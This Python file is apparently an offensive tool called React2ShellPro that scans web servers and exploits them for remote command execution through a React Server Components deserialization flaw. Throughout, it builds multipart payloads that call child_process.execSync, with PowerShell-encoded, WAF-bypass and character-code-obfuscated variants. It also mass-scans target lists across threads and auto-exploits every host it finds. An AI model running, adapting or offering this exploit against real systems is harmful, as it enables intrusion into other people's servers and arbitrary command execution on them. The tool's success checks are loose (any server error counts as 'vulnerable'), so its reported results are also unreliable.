import argparse,requests,sys,random,string,json,urllib3
from concurrent.futures import ThreadPoolExecutor,as_completed
from urllib.parse import urljoin,urlparse
import time
from base64 import b64encode
import urllib.parse

class React2ShellPro:
    def __init__(self):
        self.session=requests.Session()
        self.results=[]
        self.vulnerable_hosts=[]
        
    def normalize_url(self,host):
        host=host.strip()
        if not host:
            return ""
        if not host.startswith(("http://","https://")):
            host=f"https://{host}"
        return host.rstrip("/")
        
    def generate_polyglot_payload(self,cmd,waf_bypass=False):
        boundary="----WebKitFormBoundary"+''.join(random.choices(string.ascii_letters+string.digits,k=16))
        cmd_encoded=b64encode(cmd.encode()).decode()
        
        if waf_bypass:
            payload_part=(
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                f'"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
                f'"var res=require(\'child_process\').execSync(\'{cmd}\').toString();;'
                'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
                '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
            )
        else:
            payload_part=(
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                f'"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
                f'"var res=require(\'child_process\').execSync(\'{cmd}\').toString();;'
                'throw Object.assign(new Error(\'RCE_DETECTED\'),{message: res});",'
                '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
            )
            
        body=(
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{payload_part}\r\n"
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
            f"------{boundary}--"
        )
        
        return body,f"multipart/form-data; boundary={boundary}"
        
    def generate_windows_payload(self,cmd):
        boundary="----WebKitFormBoundary"+''.join(random.choices(string.ascii_letters+string.digits,k=16))
        cmd_b64=b64encode(cmd.encode('utf-16le')).decode()
        
        payload_part=(
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            f'"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
            f'"var res=require(\'child_process\').exec(\'powershell -enc {cmd_b64}\').toString();;'
            'throw Object.assign(new Error(\'RCE_DETECTED\'),{message: res});",'
            '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
        )
        
        body=(
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{payload_part}\r\n"
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
            f"------{boundary}--"
        )
        
        return body,f"multipart/form-data; boundary={boundary}"
        
    def generate_obfuscated_payload(self,cmd):
        boundary="----WebKitFormBoundary"+''.join(random.choices(string.ascii_letters+string.digits,k=16))
        
        # Obfuscate the payload using string concatenation
        obfuscated_cmd=""
        for char in cmd:
            obfuscated_cmd+=f"String.fromCharCode({ord(char)})+"
        obfuscated_cmd=obfuscated_cmd[:-1] # Remove last +
        
        payload_part=(
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            f'"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
            f'"var res=require(\'child_process\').execSync({obfuscated_cmd}).toString();;'
            'throw Object.assign(new Error(\'RCE_DETECTED\'),{message: res});",'
            '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
        )
        
        body=(
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{payload_part}\r\n"
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"------{boundary}\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
            f"------{boundary}--"
        )
        
        return body,f"multipart/form-data; boundary={boundary}"
        
    def send_payload(self,url,body,headers,verify_ssl=True,timeout=10):
        try:
            response=self.session.post(
                url,
                data=body,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl
            )
            return response
        except Exception as e:
            return None
            
    def check_vulnerability(self,host,cmd="id",windows=False,waf_bypass=False,timeout=10,verify_ssl=True,headers=None):
        if headers is None:
            headers={}
            
        url=self.normalize_url(host)
        if not url:
            return {"host":host,"vulnerable":False,"error":"Invalid URL"}
            
        test_endpoints=[
            "/api/upload",
            "/upload",
            "/file-upload",
            "/api/file",
            "/files",
            "/_next/data/",
            "/api/data"
        ]
        
        # Generate different payloads based on OS and bypass options
        if windows:
            body,content_type=self.generate_windows_payload(cmd)
        elif waf_bypass:
            body,content_type=self.generate_polyglot_payload(cmd,waf_bypass=True)
        else:
            body,content_type=self.generate_obfuscated_payload(cmd)
            
        # Add content length header
        headers.update({
            "Content-Type":content_type,
            "Content-Length":str(len(body)),
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        
        # Try multiple endpoints
        for endpoint in test_endpoints:
            full_url=urljoin(url,endpoint)
            try:
                response=self.send_payload(full_url,body,headers,verify_ssl,timeout)
                if response:
                    # Check for successful exploitation indicators
                    if ("RCE_DETECTED" in response.text or 
                        "NEXT_REDIRECT" in response.text or 
                        "digest" in response.text or
                        response.status_code in [500,502,503] or
                        "res=" in response.text):
                        
                        return {
                            "host":host,
                            "url":full_url,
                            "vulnerable":True,
                            "response_code":response.status_code,
                            "response_length":len(response.text),
                            "verification":"Payload executed successfully"
                        }
            except Exception as e:
                continue
                
        return {"host":host,"vulnerable":False,"error":"No vulnerable endpoint found"}
        
    def exploit_target(self,host,cmd,windows=False,waf_bypass=False,timeout=10,verify_ssl=True,headers=None):
        if headers is None:
            headers={}
            
        url=self.normalize_url(host)
        if not url:
            return {"host":host,"success":False,"error":"Invalid URL"}
            
        # Generate exploit payload
        if windows:
            body,content_type=self.generate_windows_payload(cmd)
        elif waf_bypass:
            body,content_type=self.generate_polyglot_payload(cmd,waf_bypass=True)
        else:
            body,content_type=self.generate_obfuscated_payload(cmd)
            
        headers.update({
            "Content-Type":content_type,
            "Content-Length":str(len(body)),
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        
        # Try exploitation on common endpoints
        exploit_endpoints=[
            "/api/upload",
            "/upload",
            "/file-upload",
            "/api/file",
            "/_next/data/BUILD_ID/endpoint.json"
        ]
        
        for endpoint in exploit_endpoints:
            full_url=urljoin(url,endpoint)
            try:
                response=self.send_payload(full_url,body,headers,verify_ssl,timeout)
                if response:
                    # Extract command output if possible
                    output=""
                    if "message:" in response.text:
                        try:
                            start=response.text.find("message:")+9
                            end=response.text.find("});",start)
                            if end==-1:
                                end=len(response.text)
                            output=response.text[start:end].strip()
                        except:
                            pass
                            
                    return {
                        "host":host,
                        "url":full_url,
                        "success":True,
                        "command":cmd,
                        "output":output,
                        "response_code":response.status_code,
                        "response_length":len(response.text)
                    }
            except Exception as e:
                continue
                
        return {"host":host,"success":False,"error":"Exploitation failed"}
        
    def scan_targets(self,hosts,threads=10,timeout=10,verify_ssl=True,windows=False,waf_bypass=False,cmd="id"):
        results=[]
        vulnerable_count=0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures={executor.submit(self.check_vulnerability,host,cmd,windows,waf_bypass,timeout,verify_ssl):host for host in hosts}
            
            for future in as_completed(futures):
                result=future.result()
                results.append(result)
                if result.get("vulnerable"):
                    vulnerable_count+=1
                    self.vulnerable_hosts.append(result["host"])
                    
        return {"results":results,"vulnerable_count":vulnerable_count}
        
    def auto_exploit(self,cmd="whoami",windows=False,waf_bypass=False,timeout=10,verify_ssl=True):
        exploit_results=[]
        for host in self.vulnerable_hosts:
            result=self.exploit_target(host,cmd,windows,waf_bypass,timeout,verify_ssl)
            exploit_results.append(result)
        return exploit_results

def main():
    parser=argparse.ArgumentParser(description="Advanced React2Shell Scanner and Exploiter - ProwlSec")
    parser.add_argument("-u","--url",help="Single target URL")
    parser.add_argument("-l","--list",help="File containing list of targets")
    parser.add_argument("-c","--command",default="id",help="Command to execute (default: id)")
    parser.add_argument("-w","--windows",action="store_true",help="Target Windows systems")
    parser.add_argument("-t","--threads",type=int,default=10,help="Number of concurrent threads")
    parser.add_argument("--timeout",type=int,default=10,help="Request timeout in seconds")
    parser.add_argument("--no-ssl-verify",action="store_false",help="Disable SSL certificate verification")
    parser.add_argument("--waf-bypass",action="store_true",help="Use WAF bypass techniques")
    parser.add_argument("--auto-exploit",action="store_true",help="Automatically exploit vulnerable targets")
    parser.add_argument("-o","--output",help="Output file for results")
    parser.add_argument("-v","--verbose",action="store_true",help="Verbose output")
    
    args=parser.parse_args()
    
    if not args.url and not args.list:
        print("Error: Either -u or -l option is required")
        parser.print_help()
        sys.exit(1)
        
    hosts=[]
    if args.url:
        hosts.append(args.url)
    if args.list:
        try:
            with open(args.list,"r") as f:
                hosts.extend([line.strip() for line in f if line.strip()])
        except Exception as e:
            print(f"Error reading target list: {e}")
            sys.exit(1)
            
    if not hosts:
        print("Error: No valid targets provided")
        sys.exit(1)
        
    scanner=React2ShellPro()
    
    print(f"[+] Scanning {len(hosts)} targets for React2Shell vulnerability...")
    scan_result=scanner.scan_targets(
        hosts,
        threads=args.threads,
        timeout=args.timeout,
        verify_ssl=args.no_ssl_verify,
        windows=args.windows,
        waf_bypass=args.waf_bypass,
        cmd=args.command
    )
    
    print(f"[+] Scan complete. Found {scan_result['vulnerable_count']} vulnerable targets.")
    
    # Print vulnerable hosts
    if scanner.vulnerable_hosts:
        print("\n[+] Vulnerable Hosts:")
        for host in scanner.vulnerable_hosts:
            print(f"  - {host}")
            
    # Auto exploit if requested
    if args.auto_exploit and scanner.vulnerable_hosts:
        print(f"\n[+] Automatically exploiting {len(scanner.vulnerable_hosts)} targets...")
        exploit_results=scanner.auto_exploit(
            cmd=args.command,
            windows=args.windows,
            waf_bypass=args.waf_bypass,
            timeout=args.timeout,
            verify_ssl=args.no_ssl_verify
        )
        
        print("\n[+] Exploitation Results:")
        for result in exploit_results:
            if result.get("success"):
                print(f"[!] {result['host']} - SUCCESS")
                if result.get("output"):
                    print(f"    Output: {result['output']}")
            else:
                print(f"[-] {result['host']} - FAILED ({result.get('error','Unknown error')})")
                
    # Save results if output file specified
    if args.output:
        try:
            with open(args.output,"w") as f:
                json.dump({
                    "scan_results":scan_result,
                    "exploit_results":scanner.auto_exploit() if args.auto_exploit else []
                },f,indent=2)
            print(f"\n[+] Results saved to {args.output}")
        except Exception as e:
            print(f"[-] Failed to save results: {e}")

if __name__=="__main__":
    main()
